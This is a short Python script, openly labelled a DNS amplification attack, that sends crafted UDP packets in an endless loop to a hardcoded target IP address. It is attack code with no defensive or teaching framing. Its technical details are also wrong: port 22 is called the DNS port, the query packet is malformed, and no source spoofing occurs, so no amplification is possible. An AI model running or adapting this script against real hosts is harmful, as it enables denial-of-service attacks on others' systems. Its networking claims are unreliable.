import socket
import random
import struct

target = "207.180.234.134"  # Target IP address
port = 22  # DNS port

def generate_dns_query():
    # Craft a DNS query for amplification
    transaction_id = random.randint(0, 100)
    flags = 0x0100  # Standard query, recursion desired
    questions = 1
    header = struct.pack('!HHHHHH', transaction_id, flags, questions, 0, 0, 0)
    domain = "openai.org"  # Domain to be queried
    query_type = 0x0001  # A record
    query_class = 0x0001  # IN class
    question = struct.pack('!HH', query_type, query_class) + domain.encode('utf-8') + b'\x00'
    return header + question

def send_dns_amplification_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            query = generate_dns_query()
            s.sendto(query, (target, port))
            s.close()
            print("DNS amplification attack sent to", target)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(e)

def main():
    # Launch the DNS amplification attack
    send_dns_amplification_attack()

if __name__ == "__main__":
    main()
